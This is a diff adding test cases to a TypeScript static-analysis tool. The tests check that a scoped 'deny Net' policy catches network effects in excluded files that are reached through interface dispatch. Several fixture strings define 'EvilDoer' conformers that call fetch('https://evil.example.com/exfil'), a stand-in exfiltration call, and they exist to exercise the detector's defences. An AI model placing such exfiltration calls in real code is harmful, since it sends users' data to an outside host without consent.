@@ -4530,6 +4530,166 @@ export function runs(): Buffer { return execSync("ls"); }`,
   fs.rmSync(clean, { recursive: true, force: true });
 }
 
+// ── ⟨CARDINAL SIN FIX, caller-path scope⟩ A PEEK FINDING SCOPE-MATCHED AGAINST THE WRONG ENTITY ───────
+// BACKLOG "FOUR-WAY CARDINAL SIN — a peek finding is scope-matched against the WRONG ENTITY", the ts
+// entry: the peek's synthetic tsconfig lists ONLY the excluded files as roots, so its findings are named
+// (and scope-tested) against the EXCLUDED DECLARATION's own qualified name — never the IN-SCOPE CALLER a
+// scope like `deny Net Runner` is written against. MEASURED, pre-fix: `deny Net Runner` over an in-scope
+// `RunnerMain` dispatching (via a factory returning the shared `Doer` interface) into an excluded
+// `EvilDoer implements Doer` performing `fetch(...)` answered exit 0, `outOfScope: []` — while the
+// UNSCOPED `deny Net` on the identical tree already named `EvilDoer.work` directly. Reproduced identically
+// on a PURE-STRUCTURAL conformer (an object literal typed `: Doer`, no `implements` at all) — the
+// dispatch MECHANISM is irrelevant, because the peek child never attempts dispatch resolution against
+// in-scope code at all; it infers an effect on a function and the parent tested scope against that
+// function's own name and nothing else. Fixed by giving the peek's OWN excluded-file re-parse a cheap,
+// syntax-level `satisfies` annotation (which interface an `implements X` / `: X` names) and correlating it,
+// in the PARENT, against interfaces this run's OWN primary analysis already knows are dispatched into
+// in-scope (`localIfaceDispatchCallers`, recorded at the CHA resolution site itself — not reconstructed
+// from the flat callgraph, which cannot distinguish a genuine interface dispatch from a caller that merely
+// ALSO happens to call one implementer directly by concrete type).
+if (blk()) {
+  const doerSrc = `export interface Doer { work(): void; }\n`;
+  const runnerSrc = () => `import { createDoer } from "./factory";
+export class RunnerMain {
+  static invoke(): void {
+    const d = createDoer();
+    d.work();
+  }
+}
+`;
+  const factorySrcNominal = `import { Doer, PureDoer } from "./doer";
+export function createDoer(): Doer { return new PureDoer(); }
+`;
+  const factorySrcStructural = `import { Doer, pureDoer } from "./doer";
+export function createDoer(): Doer { return pureDoer; }
+`;
+  const evilNominal = `import { Doer } from "../src/doer";
+export class EvilDoer implements Doer {
+  work(): void { fetch("https://evil.example.com/exfil"); }
+}
+`;
+  const evilStructural = `import { Doer } from "../src/doer";
+export const evilDoer: Doer = {
+  work(): void { fetch("https://evil.example.com/exfil"); }
+};
+`;
+  const nominalTree = project({
+    "src/doer.ts": doerSrc + `export class PureDoer implements Doer { work(): void { } }\n`,
+    "src/factory.ts": factorySrcNominal,
+    "src/runner.ts": runnerSrc(),
+    "tests/evil.test.ts": evilNominal,
+  });
+  const structuralTree = project({
+    "src/doer.ts": doerSrc + `export const pureDoer: Doer = { work(): void { } };\n`,
+    "src/factory.ts": factorySrcStructural,
+    "src/runner.ts": runnerSrc(),
+    "tests/evil.test.ts": evilStructural,
+  });
+  const scopedPol = (d) => { const p = path.join(d, "scoped.pol"); fs.writeFileSync(p, "deny Net Runner\n"); return p; };
+  const unscopedPol = (d) => { const p = path.join(d, "unscoped.pol"); fs.writeFileSync(p, "deny Net\n"); return p; };
+
+  // 1. BOTH DEFECT VARIANTS: silent pre-fix, caught post-fix.
+  const nomScoped = scan(nominalTree, "--policy", scopedPol(nominalTree));
+  check("⟨CARDINAL SIN FIX⟩ nominal `implements Doer`: a scope written against the IN-SCOPE CALLER now catches the excluded conformer — exit 2",
+        nomScoped.r.status === 2 && (nomScoped.report?.outOfScope ?? []).some((e) => e.fn === "work" && (e.effects ?? []).includes("Net")),
+        `exit ${nomScoped.r.status}: ${JSON.stringify(nomScoped.report?.outOfScope)}`);
+  const structScoped = scan(structuralTree, "--policy", scopedPol(structuralTree));
+  check("⟨CARDINAL SIN FIX⟩ pure-structural conformer (no `implements` at all): the SAME scoped rule catches it too — dispatch mechanism is irrelevant",
+        structScoped.r.status === 2 && (structScoped.report?.outOfScope ?? []).some((e) => (e.effects ?? []).includes("Net")),
+        `exit ${structScoped.r.status}: ${JSON.stringify(structScoped.report?.outOfScope)}`);
+
+  // 2. UNSCOPED CONTROL: already caught pre-fix, and must stay a SINGLE finding — no double-report from
+  // the new caller-path identity being tested ALONGSIDE the excluded declaration's own (already-matching)
+  // name.
+  const nomUnscoped = scan(nominalTree, "--policy", unscopedPol(nominalTree));
+  check("⟨CARDINAL SIN FIX⟩ CONTROL: the unscoped rule still catches it, exactly ONCE — no duplicate from the widened scope test",
+        nomUnscoped.r.status === 2 && (nomUnscoped.report?.outOfScope ?? []).length === 1,
+        JSON.stringify(nomUnscoped.report?.outOfScope));
+
+  // 3. ATTRIBUTION CONTROL: the finding names the EXCLUDED declaration, never the in-scope caller —
+  // ts always knows this precisely (unlike candor-swift's harder multi-file case); only the SCOPE TEST
+  // widened, not the identity a reader is told to go fix.
+  const attributed = nomScoped.report?.outOfScope ?? [];
+  check("⟨CARDINAL SIN FIX⟩ ATTRIBUTION: names the excluded declaration (`work` / tests/evil.test.ts), never `RunnerMain`",
+        attributed.length === 1 && attributed[0].fn === "work" && attributed[0].path === "tests/evil.test.ts",
+        JSON.stringify(attributed));
+
+  // 4. OVER-CHARGE CONTROL: an excluded conformer NOTHING calls through the shared interface — RunnerMain
+  // here calls the concrete `PureDoer` directly (no `Doer`-typed variable), so there is no dispatch site
+  // for the widened scope test to ride on. Also isolates the fix's `localIfaceDispatchCallers` from a
+  // coincidental-target false positive: RunnerMain calling `PureDoer.work()` by CONCRETE type must not be
+  // mistaken for a genuine interface dispatch merely because it lands on the same target a real dispatch
+  // could reach.
+  const unreachedTree = project({
+    "src/doer.ts": `export interface Doer { work(): void; }\nexport class PureDoer implements Doer { work(): void { } }\n`,
+    "src/runner.ts": `import { PureDoer } from "./doer";
+export class RunnerMain { static invoke(): void { const d = new PureDoer(); d.work(); } }
+`,
+    "tests/evil.test.ts": evilNominal,
+  });
+  const unreached = scan(unreachedTree, "--policy", scopedPol(unreachedTree));
+  check("⟨CARDINAL SIN FIX⟩ OVER-CHARGE CONTROL: nothing dispatches through the shared interface (a direct concrete call is not a dispatch site) — scope stays UNMATCHED, exit 0",
+        unreached.r.status === 0 && (unreached.report?.outOfScope ?? []).length === 0,
+        `exit ${unreached.r.status}: ${JSON.stringify(unreached.report?.outOfScope)}`);
+
+  // 5. UNATTRIBUTABLE, DISCLOSE RATHER THAN DROP: the excluded conformer's own `implements`/type
+  // annotation names an interface this isolated re-parse cannot resolve at all (a `paths`-mapped import
+  // the synthetic tsconfig has no `paths` for) — genuinely unattributable, not merely irrelevant. Reuses
+  // candor-swift's `dispatch-widened` class name (`7378f4f`) rather than inventing a second one; no SPEC
+  // clause covers either engine's use of it yet.
+  const aliasedTree = project({
+    "tsconfig.json": JSON.stringify({
+      compilerOptions: { target: "ES2022", module: "commonjs", baseUrl: ".", paths: { "@app/*": ["src/*"] } },
+      include: ["src", "tests"],
+    }),
+    "src/doer.ts": doerSrc + `export class PureDoer implements Doer { work(): void { } }\n`,
+    "src/factory.ts": `import { Doer, PureDoer } from "@app/doer";
+export function createDoer(): Doer { return new PureDoer(); }
+`,
+    "src/runner.ts": runnerSrc(),
+    "tests/evil.test.ts": `import { Doer } from "@app/doer";
+export class EvilDoer implements Doer {
+  work(): void { fetch("https://evil.example.com/exfil"); }
+}
+`,
+  });
+  const aliased = scan(aliasedTree, "--policy", scopedPol(aliasedTree));
+  check("⟨dispatch-widened⟩ an unresolvable `implements` target is DISCLOSED, not silently trusted as out of reach — exit 2, class `dispatch-widened`",
+        aliased.r.status === 2 && (aliased.report?.outOfScope ?? []).some((e) => e.class === "dispatch-widened" && e.fn === "work"),
+        `exit ${aliased.r.status}: ${JSON.stringify(aliased.report?.outOfScope)}`);
+
+  // 6. OVER-CHARGE CONTROL, real-world shape (typestack/class-validator, `ValidatorJS.IsDecimalOptions`):
+  // an UNRELATED unresolved type annotation, reached via a QUALIFIED namespace access rather than a bare
+  // imported identifier, must not turn a scoped rule into an unscoped one for every excluded file that
+  // happens to contain ANY unresolvable ambient-global reference. `resolveIface` requires a bare
+  // Identifier for exactly this reason — a project's OWN local interface is always reached that way, a
+  // qualified `Namespace.Type` is the signature of a third-party ambient global no project-relative scope
+  // was ever written to reach.
+  const namespacedTree = project({
+    "src/doer.ts": doerSrc + `export class PureDoer implements Doer { work(): void { } }\n`,
+    "src/factory.ts": factorySrcNominal,
+    "src/runner.ts": runnerSrc(),
+    "tsconfig.json": JSON.stringify({
+      compilerOptions: { target: "ES2022", module: "commonjs", baseUrl: ".", paths: { "@app/*": ["src/*"] } },
+      include: ["src", "tests"],
+    }),
+    "tests/evil.test.ts": `import * as NS from "@app/doer";
+// Both statements are top-level: their effects fold into the SAME \`<module>\` unit, exactly the
+// real-world shape (typestack/class-validator) where an unrelated \`ValidatorJS.IsDecimalOptions\`-typed
+// options object shared a file's module-init unit with an unrelated Unknown-producing statement.
+// \`NS.Doer\` is UNRESOLVABLE here (the \`@app/*\` path alias needs the real project's tsconfig, exactly
+// like the \`dispatch-widened\` fixture above) — genuinely the shape the guard exists for, reached through
+// a QUALIFIED namespace access rather than a bare imported identifier.
+const opts: NS.Doer = { work(): void { } };
+fetch("https://evil.example.com/exfil", opts as any);
+`,
+  });
+  const namespaced = scan(namespacedTree, "--policy", scopedPol(namespacedTree));
+  check("⟨CARDINAL SIN FIX⟩ OVER-CHARGE CONTROL: a QUALIFIED, UNRESOLVABLE namespace type reference (`NS.Doer`) never engages the widening/disclose mechanism — scope stays UNMATCHED, exit 0",
+        namespaced.r.status === 0 && (namespaced.report?.outOfScope ?? []).length === 0,
+        `exit ${namespaced.r.status}: ${JSON.stringify(namespaced.report?.outOfScope)}`);
+}
+
 // ── ⟨0.33⟩ `outOfScope`/`scannedUnder` MUST NOT COLLAPSE "ASKED AND CLEAR" INTO "NEVER ASKED" ────────
 // MEASURED four-way over a policy-scanned tree with NOTHING excluded: candor-java and candor-rust both
 // emit `outOfScope: []` and `scannedUnder: {deny: […]}` — a policy stood and it denied nothing found
